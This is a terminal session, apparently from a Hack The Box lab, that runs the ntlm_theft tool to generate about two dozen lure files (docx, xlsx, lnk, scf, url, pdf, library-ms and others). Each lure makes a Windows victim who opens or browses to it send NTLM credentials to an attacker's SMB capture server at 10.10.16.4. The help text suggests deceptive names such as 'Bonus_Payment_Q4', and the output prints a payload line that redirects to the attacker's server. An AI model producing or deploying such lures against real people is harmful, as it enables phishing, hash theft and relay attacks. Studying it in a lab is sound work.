```
└─$ python3.13 ntlm_theft/ntlm_theft.py -h
/home/kali/htb/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
usage: ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>

ntlm_theft by Jacob Wilkin(Greenwolf)

options:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -vv, --verbose        Verbose Mode
  -g, --generate {all,pdf,htm,libraryms,m3u,asx,jnlp,application,url,xml,autoruninf,rtf,docx,scf,xlsx,wax,zoom,modern,desktopini,lnk}
                        Choose to generate all files or a specific filetype
  -s, --server SERVER   The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)
  -f, --filename FILENAME
                        The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)
                                                                                                                                                                       
└─$ python3.13 ntlm_theft/ntlm_theft.py -g all -s 10.10.16.4 -f test
/home/kali/htb/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/test.library-ms (BROWSE TO FOLDER)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL
Generation Complete.

└─$ ls -l test
total 208
-rw-rw-r-- 1 kali kali    78 Oct 14 19:35  Autorun.inf
-rw-rw-r-- 1 kali kali    46 Oct 14 19:35  desktop.ini
-rw-rw-r-- 1 kali kali  1649 Oct 14 19:35  test.application
-rw-rw-r-- 1 kali kali   146 Oct 14 19:35  test.asx
-rw-rw-r-- 1 kali kali  5855 Oct 14 19:35 'test-(externalcell).xlsx'
-rw-rw-r-- 1 kali kali 10222 Oct 14 19:35 'test-(frameset).docx'
-rw-rw-r-- 1 kali kali 72584 Oct 14 19:35 'test-(fulldocx).xml'
-rw-rw-r-- 1 kali kali   113 Oct 14 19:35 'test-(handler).htm'
-rw-rw-r-- 1 kali kali    78 Oct 14 19:35  test.htm
-rw-rw-r-- 1 kali kali   107 Oct 14 19:35 'test-(icon).url'
-rw-rw-r-- 1 kali kali 10216 Oct 14 19:35 'test-(includepicture).docx'
-rw-rw-r-- 1 kali kali   191 Oct 14 19:35  test.jnlp
-rw-rw-r-- 1 kali kali  1218 Oct 14 19:35  test.library-ms
-rw-rw-r-- 1 kali kali  2164 Oct 14 19:35  test.lnk
-rw-rw-r-- 1 kali kali    48 Oct 14 19:35  test.m3u
-rw-rw-r-- 1 kali kali   769 Oct 14 19:35  test.pdf
-rw-rw-r-- 1 kali kali 26283 Oct 14 19:35 'test-(remotetemplate).docx'
-rw-rw-r-- 1 kali kali   102 Oct 14 19:35  test.rtf
-rw-rw-r-- 1 kali kali    84 Oct 14 19:35  test.scf
-rw-rw-r-- 1 kali kali   162 Oct 14 19:35 'test-(stylesheet).xml'
-rw-rw-r-- 1 kali kali  1638 Oct 14 19:35  test.theme
-rw-rw-r-- 1 kali kali    55 Oct 14 19:35 'test-(url).url'
-rw-rw-r-- 1 kali kali    54 Oct 14 19:35  test.wax
-rw-rw-r-- 1 kali kali   115 Oct 14 19:35  zoom-attack-instructions.txt
```
